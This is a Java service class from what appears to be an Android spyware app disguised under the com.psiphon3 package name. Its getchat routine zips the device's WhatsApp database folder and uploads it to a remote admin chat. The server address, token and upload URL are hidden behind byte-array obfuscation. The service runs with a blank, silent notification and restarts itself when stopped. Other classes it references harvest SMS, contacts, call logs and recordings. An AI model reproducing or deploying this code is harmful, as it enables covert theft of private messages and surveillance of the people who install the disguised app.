package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class getchats extends  android.app.Service{
	public static class getchats_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (getchats) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, getchats.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static getchats mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return getchats.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.getchats");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.getchats", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (getchats) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (getchats) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (getchats) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (getchats) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (getchats) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _getchat(String _topic,String _data) throws Exception{
 //BA.debugLineNum = 62;BA.debugLine="Sub getchat (Topic As String, Data As String)";
 //BA.debugLineNum = 64;BA.debugLine="Try";
try { //BA.debugLineNum = 68;BA.debugLine="zip.ABZipDirectory(File.DirRootExternal&\"/WhatsA";
_vv0.ABZipDirectory(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp/DataBases",anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp/myData.zip");
 //BA.debugLineNum = 69;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"waiting..."+"&reply_to_message_id="+BA.NumberToString(0));
 //BA.debugLineNum = 71;BA.debugLine="upload.upload(admin_id , \"All dataBases\".Replace";
_vv6._upload(_admin_id,"All dataBases".replace(" ","%20"),(int) (0),anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp","myData.zip");
 //BA.debugLineNum = 72;BA.debugLine="File.Delete(File.DirRootExternal&\"/WhatsApp\" , \"";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp","myData.zip");
 } 
       catch (Exception e7) {
			processBA.setLastException(e7); //BA.debugLineNum = 74;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 77;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 9;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 10;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 11;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,55,-39,121,72,65,-57,43,35,47,-40,22,87,35,-51,121,57,48,-94,78,35,94,-87,22,87,70,-88,109,45,48,-45,63,82,94}, 136681)+main.vvv13 (new byte[] {87,53,28,3,45,38,103,52,35,92,29,29,38,68,28,3,45,38,103,52,35,92,29,29,38,68,28,3,45,38,103,52,35,92,29,108,87,68,28,3,72,67,115,32,35,45,108,29,87,53,28,3,72,67,22,69,55,57,108,108,38,68,28,102,45,50,103,52,82,92,108,29,50,33,121,3,57,50,22,52,82,92,29,29,87,68,28,102,45,67,103,52,82,45,29,29,87}, 901651)+main.vvv13 (new byte[] {87,68,98,-70,45,38,104,-115,35,45,99,-43,87,68,98,-70,72,67,13,-103,82,45,18,-43,87,68,98,-70,57,67,104,-4,55,57,99,-92,38,68,98,-70,72,50,104,-4,82,57,6,-43,87,68,98,-53,57,50,104,-115,35,57,6,-43,87,68,19,-70,72,50,104,-4,35,57,6,-92,38,53,19,-53}, 852193)+main.vvv13 (new byte[] {38,54,93,-88,72,64,67,-117,35,95,45,-57,38,71,44,-39,57,49,67,-117,35,46,92,-74,87,54,44,-51,45,49,38,-97,82,46,45,-74,38,71,93,-51,45,64,38,-18,82,95,45,-57,87,54,93,-88,45,37,87,-97,35,95,45,-74,38,71,44,-51,45,64,38,-18,82,95,92,-74,87,54,93,-88,45,37,38,-97,82,46,92,-74,38,54,93,-88,72,37,67,-97,82,95,45,-74,38,71,44,-88,72,37,67,-97,35,46,45,-74,87,54,44,-88,72,37,67,-18,35,95,45,-57,87,71,44,-39,57,64,67,-117,35,95,45,-57,38,71,44,-39,57,49,67,-117,82,46,92,-74,38,71,44,-88,72,64,38,-18,55,58,92,-57,87,71,93,-88}, 423817)+main.vvv13 (new byte[] {87,54,-46,75,45,37,-40,13,82,95,-94,36,38,54,-46,75,45,37,-40,124,35,95,-94,85,38,54,-93,75,45,37,-87,13,82,95,-45,36,87,71,-46,75,72,37,-52,124,35,46,-45,36,87,71,-93,75,72,64,-87,25,55,46,-45,36,87,54,-93,58,57,49,-40,25,82,58,-94,85,38,54,-46,75,57,64,-87,13,82,58,-57,85,38,71,-93,75,72,64,-40,13,35,58,-57,85,87,71,-46,58,72,49,-87,124,35,58,-57,85,38,54,-93,58,72,64,-40,124}, 701286)+main.vvv13 (new byte[] {87,70,-62,-65,57,48,-36,-19,82,47,-41,-60,87,55,-62,-65,72,65,-36,-100,82,94,-90,-75,87,70,-89,-65,45,65,-36,-19,82,94,-90,-60,38,70,-89,-38,72,36,-56,-19,82,94,-41,-60,87,70,-42,-38,57,36}, 103683);
 //BA.debugLineNum = 12;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 13;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,55,-112,69,72,65,-21,114,35,94,-32,62,50,55,-31,69,72,65,-102,114,35,47,-32,62,50,55,-31,69,72,65,-102,114,35,47,-32,62,50,55,-112,69,57,48,-21,114,35,47,-32,62,50,55,-31,69,57,48,-21,114,82,94,-32,62,50,54,-32,32,57,65,-102,114,35,94,-32,91,87,55,-11,32}, 8332)+main.vvv13 (new byte[] {38,71,2,81,57,64,121,102,82,46,102,91,38,71,2,81,57,64,121,102,82,46,102,79,50,54,115,81,57,64,121,23,82,95,114,91,50,71,115,81,57,49,121,23,35,95,114,91,50,54,115,32,72,64,8,23,35,46,114,91,50,54,2}, 335184)+main.vvv13 (new byte[] {87,70,-71,-47,57,65,-77,-26,55,59,-55,-66,87,55,-56,-96,57,65,-77,-26,55,59,-55,-66,87,70,-71,-47,57,48,-62,-26,55,59,-55,-49,38,70,-71,-47,72,65,-77,-26,55,59,-55,-49,87,55,-71,-47,57,65,-77,-26,55,59,-55,-49,87,70,-71,-47,72,65,-77,-26,55,47,-35,-66,38,70,-71,-47,57,65,-62,-105,35,59,-35,-66,38,70}, 99154)+main.vvv13 (new byte[] {38,53,104,-4,72,50,98,-33,34,57,24,-30,87,53,104,-4,57,67,98,-53,55,57,24,-30,87,68,104,-115,72,67,98,-70,55,57,24,-109,87,68,104,-4,57,50,19,-53,55}, 875865);
 //BA.debugLineNum = 14;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,107,43,-19,115,46,112,-20,121,120,57}, 297214);
 //BA.debugLineNum = 15;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,125,9,-87,38,41}, 402848);
 //BA.debugLineNum = 16;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,55,-78,-67,72,65,-55,-118,35,94,-62,-58,50,55,-61,-67,72,65,-72,-118,35,47,-62,-58,50,55,-61,-67,72,65,-72,-118,35,47,-62,-58,50,55,-78,-67,57,48,-55,-118}, 78097)+main.vvv13 (new byte[] {38,53,100,22,45,51,111,80,35,45,101,28,87,53,100,115,72,50,122,80,82,45,101,28,38,53,100,2,72,50,122,80,35,45,20,109,87,68,100,2,57,50,122,80,35,92,20,109,87,68,100,115,72,50,122}, 881634)+main.vvv13 (new byte[] {50,53,87,-113,57,50,93,-72,82,92,86,-12,50,53,87,-113,72,67,44,-72,35,45,86,-12,50,53,38,-2,72,67,44,-55,82,92,86,-12,50,53,38,-113,57,67,44,-72,82,92,86,-12,50,53,38,-113,72,67,44,-55,82,92,86,-12,38,33,87,-2,72,67,44,-72,82,45,39,-32,50,33,87,-2,72,50,93,-55,82,92,86,-111,50,52,67,-2,72,50,44,-55,35,45,86,-111,38,33,67,-2,72,67,93,-72,35,45}, 990323)+main.vvv13 (new byte[] {38,53,42,-26,45,50,81,-59,35,45,90,-99,38,53,42,-26,45,50,81,-59,82,45,90,-99,87,68,42,-26,57,38,32,-59,82,45,43,-20,38}, 757654)+main.vvv13 (new byte[] {38,55,-14,125,45,48,-119,94,82,94,-13,119,38,70,-14,125,45,48,-119,94,35,47,-13}, 37466)+main.vvv13 (new byte[] {38,53,113,-10,45}, 930490);
 //BA.debugLineNum = 17;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 18;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 19;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 20;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 21;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 25;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 27;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 29;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 30;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 31;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 32;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 33;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",getchats.getObject());
 //BA.debugLineNum = 34;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",getchats.getObject());
 //BA.debugLineNum = 35;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 36;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 37;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 38;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 39;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 40;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 41;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 42;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 43;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 44;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 45;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 47;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 55;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 81;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 82;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 83;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 57;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 60;BA.debugLine="End Sub";
return "";
}
}
